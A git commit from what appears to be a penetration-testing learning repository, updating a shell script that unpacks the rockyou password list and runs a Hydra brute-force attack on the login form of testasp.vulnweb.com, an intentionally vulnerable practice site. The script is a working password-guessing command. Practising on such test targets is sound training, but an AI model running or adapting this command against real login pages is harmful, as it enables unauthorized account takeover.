86450fb8a371ca7bc5c75e0b49b161e8cb60e91e
Youngermaster <juanmanuel12.13jmyh81@gmail.com>
2021-09-20 11:01:07 -0500

    🐍 Brute force example with Hydra was updated

--- Kali/Hydra/brute_force.sh
+++ Kali/Hydra/brute_force.sh
@@ -1,1 +1,3 @@
+cd /usr/share/wordlists
+sudo gzip -d rockyou.txt.gz
 hydra -l admin -P rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
--- brute_force.sh
+++
@@ -1,1 +0,0 @@
-hydra -l admin -P rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
